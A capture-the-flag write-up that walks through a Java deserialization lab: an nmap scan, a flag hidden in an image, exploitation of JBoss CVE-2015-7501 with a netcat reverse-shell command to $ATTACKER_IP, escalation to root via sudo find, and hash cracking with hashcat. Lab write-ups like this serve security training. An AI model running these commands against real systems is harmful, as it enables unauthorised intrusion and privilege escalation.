
# **Tony the Tiger**

In this room we'll exploit Serialization Attack on Java application.

---

## *Support Material* 

This part of the room just gives us an idea about what serialization is,
which basically is converting an object to byte stream. The exploitation
begins with us tampering with this byte stream in order to trick an
application into disclosing sensitive information, executing arbitrary
code, escalating our privileges etc.

- What is a great IRL example of an "Object"? 
> lamp
- What is the acronym of a possible type of attack resulting from a
"serialisation" attack?
> DoS
- What lower-level format does data within "Objects" get converted into
> byte stream

---

## *Reconnaissance*

Let's enumerate the machine. We'll start with nmap scan:

> `sudo nmap 10.10.41.59 -Pn -p- -A -vv -T4 -oN nmap-scan --script discovery,vuln`

After running the scan, a bunch of open ports came out (17...).

- 22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
- 80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
- 1090/tcp open  java-rmi    syn-ack ttl 63 Java RMI
- 1091/tcp open  java-rmi    syn-ack ttl 63 Java RMI
- 1098/tcp open  java-rmi    syn-ack ttl 63 Java RMI
- 1099/tcp open  java-object syn-ack ttl 63 Java Object Serialization
- 3873/tcp open  java-object syn-ack ttl 63 Java Object Serialization
- 4446/tcp open  java-object syn-ack ttl 63 Java Object Serialization
- 4712/tcp open  msdtc       syn-ack ttl 63 Microsoft Distributed Transaction Coordinator (error)
- 4713/tcp open  pulseaudio? syn-ack ttl 63
- 5445/tcp open  smbdirect?  syn-ack ttl 63
- 5455/tcp open  apc-5455?   syn-ack ttl 63
- 5500/tcp open  hotline?    syn-ack ttl 63
- 5501/tcp open  tcpwrapped  syn-ack ttl 63
- 8009/tcp open  ajp13       syn-ack ttl 63 Apache Jserv (Protocol v1.3)
- 8080/tcp open  http        syn-ack ttl 63 Apache Tomcat/Coyote JSP engine 1.1
- 8083/tcp open  http        syn-ack ttl 63 JBoss service httpd

So far we've learned, that it has ssh, a couple of HTTP applications, 
it's on Ubuntu, backend uses Java.

- What service is running on port "8080"

> Apache Tomcat/Coyote JSP engine 1.1

- What is the name of the front-end application running on "8080"? (Open
it in browser)

> JBoss

---

## *Find Tony's Flag!*

http-enum and http-sitemap-generator nmap scripts have revealed some
directories, accessible via service, running on port 80:
- /
- /css/
- /images/
- /icons/
- /js/
- /page/
- /posts/frosted-flakes/
- /posts/my-first-post/

After reading blogs, walking an application, searching for comments,
hidden content, references, after running directory scanners and trying
path traversal, I got nothing.

But then I tried looking for hidden content in images and Boom!
An image at posts/frosted-flakes/ contained flag inside.

Download an image: 
> `wget https://i.imgur.com/be2sOV9.jpg`

 Retrieve the flag:
> `strings be2sOV9.jpg | grep -e '.\{5,\}'`

---

## *Exploit!*

Ok, so we have JBoss server, vulnerable to CVE-2015-7501. An exploit can
be found at [byt3bl33d3r's Github](https://github.com/byt3bl33d3r/java-deserialization-exploits),
but let's use the modified version that is supplied in this room.

1. Setup a netcat listener:
> `nc -lvnp 8080`
2. Activate a reverse shell:
> `python3 exploit.py 10.10.41.59:8080 "nc -e /bin/bash $ATTACKER_IP 8080"`

Let's upgrade our netcat shell and snoop around:

1. python3 -c "import pty; pty.spawn('/bin/bash')"
2. Ctrl+Z
3. stty raw -echo
4. fg + ['Enter' 2 times]

First thing that we find is 'note' in /home/jboss, from which we learn jboss's password.

Then we'll use `history` to find what commands were executed

> echo "I see you peeping! You're on the right lines..."

Interesting. Let's `cat /home/jboss/.bash_history`. We will find another flag there.

---

## *Escalate!*

Ok, it's time for privilege escalation! First, switch to user *jboss*;
Then, type `sudo -l` to see what he can run with sudo

> Matching Defaults entries for jboss on thm-java-deserial:
>    env_reset, mail_badpass,
>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User jboss may run the following commands on thm-java-deserial:
>    (ALL) NOPASSWD: /usr/bin/find

Locate payload on [GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo) and escalate
your privileges to root.

Navigate to /root. You'll find base64 encoded flag:

Decode it:

> `echo '$ENCODED_FLAG' | base64 -d`

Determine hash type:

> `name-that-hash --text "$FLAG"`

Crack MD5 hash with hashcat and rockyou wordlist:

> `hashcat --force -m 0 -a 0 hash.txt ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt`

Finally, you have a root flag.
